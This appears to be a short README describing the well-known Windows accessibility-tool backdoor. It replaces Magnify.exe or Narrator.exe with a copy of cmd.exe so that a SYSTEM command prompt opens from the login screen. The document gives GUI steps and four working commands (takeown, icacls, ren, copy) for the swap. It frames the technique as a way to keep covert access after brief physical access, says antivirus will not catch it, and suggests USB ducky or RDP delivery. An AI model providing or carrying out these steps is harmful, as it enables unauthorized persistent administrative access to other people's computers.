# Inconspicuous Windows Backdoor

This is relatively quite a new backdoor and is pretty discreet in nature but the attack scenario related to this might be a little difficult to find and implement.
One would be if we've unsupervised access to a windows machine and in order to lurk our way back in and maintain access.

### Concept & PoC
While logging into Windows (post Windows XP), there is an "Ease of Access" icon there which is very much overlooked. We will we using that option to base our PoC upon.

![win10-login](https://user-images.githubusercontent.com/55345666/156610461-8d0440d9-df47-4e08-bb6f-59bd0317b790.jpg)
![Windows-10-ease-of-access](https://user-images.githubusercontent.com/55345666/156608016-59a130b7-3ab4-41df-b7d0-dfd14cdcff4a.png)

As we can see in the options, we can execute quite a few applications with the **Ease of Access** menu, like **Magnifier.exe**, **Narrator.exe**, etc.
What the main idea is that we would be replacing one of these programs with a command prompt which we will be able to execute with **system** permissions without even logging into windows.

1. Log into windows, browse to **"C:\Windows\System32\"**, find **"Narrator.exe"** and try to rename it. You should see a message popping up regarding the file permissions.
2. It says we've only read/write permissions regarding that file and the owenership of the file belongs to "**TrustedInstaller**", but this access control feature can be disabled.
3. Go to Properties > Security > Advanced > Owner > Edit. There you can set the administrator as the new owner and save the settings. Once that is done go back to Properties > Security > Edit and give the administrator full access to the file.
4. Now we can rename **"Narrator.exe"** to whatever we want. Take a copy of **"cmd.exe"** and rename it to **"Narrator.exe"**. Once you log-out and access the menu again **command prompt** will pop up if we try to get the narrator to help us log in.

The following can be done easily via just 4 commands:

``
takeown /f "C:\Windows\System32\Magnify.exe"
``

``
icacls "C:\Windows\System32\Magnify.exe" /grant administrators:F
``

``
ren "C:\Windows\System32\Magnify.exe" "Magnify_back.exe"
``

``
copy "C:\Windows\System32\cmd.exe" "C:\Windows\System32\Magnify.exe"
``

This is a pretty neat backdoor and won't even get picked up by any antivirus softwares.
It can either be deployed through a USB ducky, RDP service or using an unauthenticated system 

### Reference Links:
http://fuzzysecurity.com/tutorials/11.html

https://www.greyhathacker.net/?p=50
